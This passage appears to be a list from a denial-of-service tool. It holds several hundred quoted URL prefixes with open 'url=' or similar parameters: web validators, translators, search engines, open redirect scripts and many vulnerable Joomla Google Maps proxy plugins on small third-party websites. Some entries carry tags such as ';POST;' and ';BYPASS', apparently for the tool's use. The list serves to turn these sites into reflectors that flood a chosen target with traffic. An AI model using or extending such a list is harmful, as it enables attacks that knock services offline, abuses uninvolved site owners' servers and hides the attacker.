     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
     'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
     'https://drive.google.com/viewerng/viewer?url=',
     'http://www.google.com/translate?u=',
     'https://developers.google.com/speed/pagespeed/insights/?url=',
     'http://help.baidu.com/searchResult?keywords=',
     'http://www.bing.com/search?q=',
     'https://add.my.yahoo.com/rss?url=',
     'https://play.google.com/store/search?q=',
     'http://www.google.com/?q=',
     'http://regex.info/exif.cgi?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.google.com/translate?u=',
     'http://translate.google.com/translate?u=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=',
     'http://validator.w3.org/check?uri=',
     'http://jigsaw.w3.org/css-validator/validator?uri=',
     'http://validator.w3.org/checklink?uri=',
     'http://www.w3.org/RDF/Validator/ARPServlet?URI=',
     'http://api.duckduckgo.com/html/?q=',
     'http://boorow.com/Pages/site_br_aspx?query=',
     'http://www.ask.com/web?q=',
     'http://search.lycos.com/web/?q=',
     'http://busca.uol.com.br/web/?q=',
     'http://us.yhs4.search.yahoo.com/yhs/search?p=',
     'http://www.heatwalkingcycling.org/index.php?pg=',
     'http://fresno.steinwaydealer.com/index.php?go=',
     'http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=',
     'http://www.karplaw.com/index.php?go=',
     'http://www.veithsymposium.org/index.php?pg=',
     'http://www.zikgu.info/search.php?go=',
     'http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=',
     'http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=',
     'http://www.opensecrets.org/open=',
     'http://www.budogu.jp/cart/syscheck.cgi?url=',
     'http://abcnews.go.com/?page=',
     'http://www.budogu.jp/cart/syscheck.cgi?url=',
     'http://www.opensecrets.org/open=',
     'http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=',
     'http://www.webmd.com/lung/tc/acute-bronchitis-topic-overview?page=',
     'http://www.benefitmall.com/?TabID=36&emailurl=',
     'http://www.tolerance.org/?source=redirect&url=teachingtolerance?url=',
     'http://www.accuride.co.jp/cgi/check.cgi?url=',
     'http://www.caafcgilsicilia.it/?id_pagina=',
     'http://www.professioni24.ilsole24ore.com/?page=',
     'http://italia.virgilio.it/?ckset=force&amp;cityRedirect=falseredirect=',
     'http://oknabm.ru/index.php?pg=',
     'http://www.thrombosis2016.org/index.php?go=',
     'http://www.gotm.net/index.php?go=',
     'http://webmail.juno.com/?cf=spl&start_page=5&session_redirect=',
     'http://david.bach.profesores.ie.edu/?profesor=david.bach&pagina=',
     'http://javier.carrillo.profesores.ie.edu/?profesor=javier.carrillo&pagina=',
     'http://www.fabrizio.salvador.profesores.ie.edu/?profesor=fabrizio.salvador&pagina=',
     'http://manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=',
     'http://efernandez-cantelli.profesores.ie.edu/?profesor=efernandez-cantelli&pagina=',
     'http://www.manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=',
     'http://www.marvin.com/?page=',
     'http://www.ivrr.de/proxy.php?url=',
     'http://validator.w3.org/checklink?uri=',
     'http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=',
     'http://www.rssboard.org/rss-validator/check.cgi?url=',
     'http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=',
     'http://prodvigator.bg/redirect.php?url=',
     'http://validator.w3.org/feed/check.cgi?url=',
     'http://www.ccm.edu/redirect/goto.asp?myURL=',
     'http://forum.buffed.de/redirect.php?url=',
     'http://rissa.kommune.no/engine/redirect.php?url=',
     'http://www.sadsong.net/redirect.php?url=',
     'https://www.fvsbank.com/redirect.php?url=',
     'http://www.jerrywho.de/?s=/redirect.php?url=',
     'http://www.inow.co.nz/redirect.php?url=',
     'http://www.automation-drive.com/redirect.php?url=',
     'http://mytinyfile.com/redirect.php?url=',
     'http://ruforum.mt5.com/redirect.php?url=',
     'http://www.websiteperformance.info/redirect.php?url=',
     'http://www.airberlin.com/site/redirect.php?url=',
     'http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=',
     'http://evoec.com/review/redirect.php?url=',
     'http://www.crystalxp.net/redirect.php?url=',
     'http://watchmovies.cba.pl/articles/includes/redirect.php?url=',
     'http://www.seowizard.ir/redirect.php?url=',
     'http://apke.ru/redirect.php?url=',
     'http://seodrum.com/redirect.php?url=',
     'http://redrool.com/redirect.php?url=',
     'http://blog.eduzones.com/redirect.php?url=',
     'http://www.onlineseoreportcard.com/redirect.php?url=',
     'http://www.wickedfire.com/redirect.php?url=',
     'http://searchtoday.info/redirect.php?url=',
     'http://www.bobsoccer.ru/redirect.php?url=',
     'http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=',
     'http://www.firmia.cz/redirect.php?url=',
     'http://palinstravels.co.uk/redirect.php?url=',
     'http://www.phuketbranches.com/admin/redirect.php?url=',
     'http://tools.strugacreative.com/redirect.php?url=',
     'http://www.elec-intro.com/redirect.php?url=',
     'http://maybeit.net/redirect.php?url=',
     'http://www.usgpru.net/redirect.php?url=',
     'http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=',
     'http://www.webaverage.com/redirect.php?url=',
     'http://www.seorehash.com/redirect.php?url=',
     'http://www.seo.khabarsaz.net/redirect.php?url=',
     'http://www.dimension-marketing.net/outils/seo/audit/redirect.php?url=',
     'http://www.informeseogratis.com/redirect.php?url=',
     'http://www.websites-canada.com/redirect.php?url=',
     'http://zakaztovarov.net/redirect.php?url=',
     'http://anonymouse.org/cgi-bin/anon-www.cgi/',
     'http://www.marumura.com/redirect.php?url=',
     'http://old.leginet.eu/redirect.php?url=',
     'http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=',
     'http://www.tuangou.do/proxy.php?url=',
     'http://www.gvpl.ca/url/proxy.php?url=',
     'http://weiter-lesen.net/web/proxy.php?url=',
     'http://soroka-vorovka.com/proxy/proxy.php?url=',
     'http://www.cogsci.ed.ac.uk/~richard/xml-check.cgi?url=',
     'http://pro.athealth.co.jp/cgi-bin/pro/check.cgi?url=',
     'http://ukrhome.net/go.php?url=',
     'http://www.aliancaandroid.com/go.php?url=',
     'http://www.hangglider.kiev.ua/go.php?url=',
     'http://it4pal.com/ar/go.php?url=',
     'http://paperplane.su/go.php?url=',
     'http://www.education.net.au/go.php?url=',
     'http://www.bloggerexp.com/go.php?url=',
     'http://www.lifetype.ru/go.php?url=',
     'http://blogerator.ru/go.php?url=',
     'http://www.hella.ru/go.php?url=',
     'http://fcmanutd.com/go.php?url=',
     'http://www.sitysoft.com/go.php?url=',
     'https://www.google.com/interstitial?url=',
     'http://www.flashreport.org/blog/go.php?url=',
     'http://www.otworld.de/go.php?url=',
     'http://www.ennk.ru/go.php?url=',
     'http://www.xoxohth.com/go.php?url=',
     'http://dochtm.com/go.php?url=',
     'http://www.autoadmit.com/go.php?url=',
     'http://www.vttour.fr/actu/go.php?url=',
     'http://www.geodream.ru/go.php?url=',
     'http://jp.trefoil.tv/go.php?url=',
     'http://irc.ifmo.ru/go.php?url=',
     'http://baanna.net/go.php?url=',
     'http://www.morningcoffee.co.kr/go.php?url=',
     'http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=',
     'http://irc.ifmo.ru/go.php?url=',
     'http://www.webchirkut.com/go.php?url=',
     'http://www.parkcity.org/redirect.aspx?url=',
     'http://hao.zw51.cn/go.php?url=',
     'http://dmoz.by/go.php?url=',
     'http://www.dandelionradio.com/go.php?url=',
     'http://www.go.php-fusion-iran.com/go.php?url=',
     'http://helpful-information.com/relationships/go.php?url=',
     'http://www.health.omskinform.ru/go.php?url=',
     'http://www.eitforum.com/go.php?url=',
     'http://ipove.info/go.php?url=',
     'http://www.treasure-vacations.com/go.php?url=',
     'http://www.deutsche-krieger.de/go.php?url=',
     'http://rusbody.com/go.php?url=',
     'http://www.bonsai-for-beginners.com/go.php?url=',
     'http://twitnow.ru/go.php?url=',
     'http://www.1300dental.com.au/go.php?url=',
     'http://engelcosmetology.kiev.ua/go.php?url=',
     'http://vps.cohenrisk.com/~xoxohth/go.php?url=',
     'http://valaholeuropaban.uw.hu/guestbook/go.php?url=',
     'http://enrique-iglesias.net/guestbook/go.php?url=',
     'http://www.morningcoffee.co.kr/go.php?url=',
     'http://www.find-a-car.info/go.php?url=',
     'http://snowcore.net/go.php?url=',
     'http://jp.trefoil.tv/go.php?url=',
     'http://www.1300franchises.com/go.php?url=',
     'http://www.information-guru.com/book-marketing/go.php?url=',
     'http://www.boxingscene.com/weight-loss/go.php?url=',
     'http://www.ninja-thailand.com/go.php?url=',
     'http://shack.ir/go.php?url=',
     'http://www.quelsoft.com/go.php?url=',
     'http://www.jonko.eu/tools/hide_referrer/go.php?url=',
     'http://lj.hangye5.com/go.php?url=',
     'http://www.lightningring.com/guestbook/go.php?url=',
     'http://www.1300directory.com.au/go.php?url=',
     'http://www.litinvest.com/catalog/go.php?url=',
     'http://www.1300clothing.com.au/go.php?url=',
     'http://verkehrshaus.org/go.php?url=',
     'http://www.xohth.com/beta/go.php?url=',
     'http://auctionsinfo.net76.net/go.php?url=',
     'http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=',
     'http://www.1300dentist.com.au/go.php?url=',
     'http://www.forodeprogramas.com/go.php?url=',
     'http://thatware.org/go.php?url=',
     'http://www.star.lu/go.php?url=',
     'http://www.dailytechinfo.org/go.php?url=',
     'http://m-bizportal.ru/go.php?url=',
     'http://geostats2004.com/go.php?url=',
     'http://shopdazzles.com/guestbook/go.php?url=',
     'http://www.geodream.ru/go.php?url=',
     'http://www.1800dental.com.au/go.php?url=',
     'http://www.flappen.nl/gb/go.php?url=',
     'http://webmasterplus.us/go/go.php?url=',
     'http://www.sportzone.ru/go.php?url=',
     'http://kuzen.ru/go.php?url=',
     'http://1300dating.com.au/go.php?url=',
     'http://kinoamator.ru/go.php?url=',
     'http://autoqa.org/go.php?url=',
     'http://1300agents.com.au/go.php?url=',
     'http://depressionclub.awardspace.com/go.php?url=',
     'http://www.1300lifestyle.com.au/go.php?url=',
     'http://www.onlinegratis.tv/go.php?url=',
     'http://7days.kiev.ua/go.php?url=',
     'http://www.jenteporten.no/go.php?url=',
     'http://www.recipes.portalnews.de/go.php?url=',
     'http://www.infogine.com/articles/aerobics-cardio/go.php?url=',
     'http://13auto.com.au/go.php?url=',
     'http://www.socialgrid.com/go.php?url=',
     'http://www.spaleon.de/go.php?url=',
     'http://waptrochoi.net/go.php?url=',
     'http://www.ai.rug.nl/~doesburg/gbook/go.php?url=',
     'http://www.keralaclick.com/photography/go.php?url=',
     'http://kormoranfolk.hu/guestbook/go.php?url=',
     'http://sidlogic.com/content/recipes/go.php?url=',
     'http://www.languageisavirus.com/articles/writing/language/go.php?url=',
     'http://2013toyotacorolla.com/go.php?url=',
     'http://customerserviceauthority.com/go.php?url=',
     'http://www.beautytipsadvice.infoslobber.com/go.php?url=',
     'http://www.tripdirect.com/go.php?url=',
     'http://spiritual-link.com/go.php?url=',
     'http://learningresource.info/hair-loss-and-thinning/go.php?url=',
     'http://www.backpacker.no/go.php?url=',
     'http://aff.apk4fun.com/go.php?url=',
     'http://www.totalwars.ru/go.php?url=',
     'http://www.fediea.org/go.php?url=',
     'http://articles.pointshop.com/college/go.php?url=',
     'http://mcpe.tw/go.php?url=',
     'http://www.qosmo.com/go.php?url=',
     'http://www.alopa.com/go.php?url=',
     'http://coreychang.net/gbook/go.php?url=',
     'http://www.1001topwords.com/marketing1/marketing/go.php?url=',
     'http://www.bait-tackle.com/go.php?url=',
     'http://monkeezemarketing.com/go.php?url=',
     'http://www.lincolnhsbrooklyn.com/go.php?url=',
     'http://healthwebsitebusinesses.com/demo/diabetes/go.php?url=',
     'http://ww3.myonlinestats.com/go/go.php?url=',
     'http://www.wmhs.com/newmobile/redirect.php?page=',
     'http://www.szene-drinks.com/redirect.php?page=',
     'http://www.swzundert.nl/redirect.php?page=',
     'http://www.denbreems.nl/redirect.php?page=',
     'http://www.flohmarkt.ch/redirect.php?page=',
     'http://www.erhvervscentrum.dk/redirect.php?page=',
     'http://www.netintellgames.com/redirect.php?page=',
     'http://www.pia.org/IRC/qs/redirect.php?page=',
     'http://www.pcpros-tx.com/php/redirect.php?page=',
     'http://www.allencapital.com/redirect.php?page=',
     'http://www.taosadultbasketballleague.com/redirect.php?page=',
     'http://taosadultbasketball.com/redirect.php?page=',
     'http://www.graphisoftus.com/redirect.php?page=',
     'http://purificato.org/rawlab/redirect.php?page=',
     'http://www.anglobelge.com/EN/splash-page/redirect.php?page=',
     'http://tzf.free.fr/redirect.php?page=',
     'http://www.tandem-club.org.uk/files/public_html/redirect.php?page=',
     'http://rawlab.mindcreations.com/redirect.php?page=',
     'http://www.hxtrack.com/redirect.php?page=',
     'http://signaturesx.com/redirect.php?page=',
     'http://www.fsds.sanmarinoscacchi.sm/gotoURL.asp?url=',
     'http://www.niemannpick.org/gotoURL.asp?url=',
     'http://trasparenza.atpsassari.it/gotoURL.asp?url=',
     'http://www.vespaclubportogruaro.it/gotoURL.asp?url=',
     'http://www.pillole.org/public/aspnuke/gotoURL.asp?url=',
     'http://trasparenza.atpsassari.it/gotoURL.asp?url=',
     'http://www.vespaclubportogruaro.it/gotoURL.asp?url=',
     'http://www.quiere-t.net/gotoURL.asp?url=',
     'http://www.pocoserio.com/gotoURL.asp?url=',
     'http://win.aiafa.it/gotoURL.asp?url=',
     'http://www.centromorin.it/aspnuke207/gotoURL.asp?url=',
     'http://www.asim.it/public/gotoURL.asp?url=',
     'http://www.straz.bialapodlaska.pl/km/gotoURL.asp?url=',
     'http://www.beatote.com/gotoURL.asp?url=',
     'http://www.monteargentario.it/gotoURL.asp?url=',
     'http://www.trasporti.marche.it/nuke/gotoURL.asp?url=',
     'http://www.elparadise.com/gotoURL.asp?url=',
     'http://www.chiauci-webforum.it/gotoURL.asp?url=',
     'http://www.icfpet.it/gotoURL.asp?url=',
     'http://www.dgtale.it/gotoURL.asp?url=',
     'http://www.aspnuke.it/gotoURL.asp?url=',
     'http://www.aicritalia.org/gotoURL.asp?url=',
     'http://www.viggiu-in-rete.org/newsite/gotoURL.asp?url=',
     'http://www.confederazionestellareitaliana.com/portale/gotoURL.asp?url=',
     'http://www.dffyw.com/dir/gotourl.asp?url=',
     'http://www.mentalism.it/gotoURL.asp?url=',
     'http://www.ematube.it/gotoURL.asp?url=',
     'http://www.golfclubambrosiano.it/gotoURL.asp?url=',
     'http://resuite.upg.it/gotoURL.asp?url=',
     'http://www.cgqd.com/shop/it/gotourl.asp?url=',
     'http://www.unicyclist.it/gotoURL.asp?url=',
     'http://www.the-cure.eu/gotoURL.asp?url=',
     'http://www.deminformatica.com/gotoURL.asp?url=',
     'http://www.scienzaevita.info/public/site/gotoURL.asp?url=',
     'http://www.the-cure.eu/gotoURL.asp?url=',
     'http://www.deminformatica.com/gotoURL.asp?url=',
     'http://www.scienzaevita.info/public/site/gotoURL.asp?url=',
     'http://www.idealdieta.it/gotoURL.asp?url=',
     'https://www.google.pl/interstitial?url=',
     'http://www.ematube.it/gotoURL.asp?url=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=',
     'http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=',
     'http://validator.w3.org/mobile/check?docAddr=',
     'http://validator.w3.org/p3p/20020128/p3p.pl?uri=',
     'http://online.htmlvalidator.com/php/onlinevallite.php?url=',
     'http://feedvalidator.org/check.cgi?url=',
     'http://gmodules.com/ig/creator?url=',
     'http://www.google.com/ig/adde?moduleurl=',
     'http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=',
     'http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=',
     'http://host-tracker.com/check_page/?furl=',
     'http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=',
     'http://www.onlinewebcheck.com/check.php?url=',
     'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
     'http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=',
     'http://about42.nl/www/showheaders.php;POST;about42.nl.txt',
     'http://browsershots.org;POST;browsershots.org.txt',
     'http://streamitwebseries.twww.tv/proxy.php?url=',
     'http://www.comicgeekspeak.com/proxy.php?url=',
     'http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=',
     'http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt',
     'http://web-sniffer.net/?url=',
     'http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=',
     'http://translate.yandex.net/tr-url/ru-uk.uk/',
     'http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
     'http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=',
     'http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=',
     'http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=',
     'http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=',
     'http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://GREENhousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=',
     'http://validator.w3.org/nu/?doc=',
     'http://check-host.net/check-http?host=',
     'http://www.netvibes.com/subscribe.php?url=',
     'http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=',
